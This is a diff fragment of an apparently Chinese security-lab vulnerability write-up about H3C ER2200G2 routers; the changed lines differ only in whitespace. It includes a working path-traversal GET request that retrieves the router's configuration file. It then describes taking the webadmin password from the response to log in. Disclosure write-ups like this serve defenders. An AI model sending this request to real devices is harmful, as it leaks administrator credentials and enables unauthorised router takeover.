@@ -37,7 +37,7 @@ ER G2 系列路由器是 H3C 公司推出的一款高性能路由器，它主要
 
 **0x02 影响版本**  
 
-### ERxxxxG2 (ER2200G2)
+### ERxxxxG2 (ER2200G2)
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
 
@@ -53,19 +53,19 @@ ER G2 系列路由器是 H3C 公司推出的一款高性能路由器，它主要
 
 2. 对漏洞进行复现
 
- **POC （GET）**
+ **POC （GET）**
 
 ```
 GET /userLogin.asp/../actionpolicy_status/../ER2200G2.cfg HTTP/1.1
-Host: 127.0.0.1:8081
+Host: 127.0.0.1:8081
 
 ```
 
-     漏洞复现，请求该地址查看响应结果
+     漏洞复现，请求该地址查看响应结果
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCsl6WNUnPh9j2UPTVpSDwQnOIYq0zS8RvTFLFjcHTMdNicXOGrcdXKfZiaVBpfPxXo06M7vYsqzziaA/640?wx_fmt=png)
 
- 通过泄漏的账户密码信息**成功登录**。（响应中查询 webadmin 获取密码）
+ 通过泄漏的账户密码信息**成功登录**。（响应中查询 webadmin 获取密码）
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCsl6WNUnPh9j2UPTVpSDwQYpiaGZ1wG7Vq6Zap8EmVM5wQ710tzeYPJ2s5icT2moq2ZM9A17G77U5g/640?wx_fmt=png)
 
@@ -90,7 +90,7 @@ https://www.h3c.com/cn/Products___Technology/Products/Router/Catalog/ER/ER3200/
 
 口号 网安引领时代，弥天点亮未来
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1) 
+![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1) 
 
 知识分享完了
 
@@ -102,7 +102,7 @@ https://www.h3c.com/cn/Products___Technology/Products/Router/Catalog/ER/ER3200/
 
 必降弥天之润！
 
-   弥  天
+   弥  天
 
 安全实验室  
 
